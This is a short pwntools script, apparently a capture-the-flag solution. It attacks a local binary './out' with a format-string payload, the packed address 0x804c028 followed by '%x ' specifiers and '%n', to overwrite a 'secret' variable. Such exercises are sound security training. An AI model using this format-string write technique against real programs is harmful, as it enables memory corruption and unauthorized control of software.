from pwn import *

secret = 0x804c028
p = process("./out");

p.readuntil("Wanna know a secret? Persuade me\n")

buf = p32(secret)
buf += '%x '*3
buf += '%n'
p.sendline(buf)

data = p.readall()
print(data)
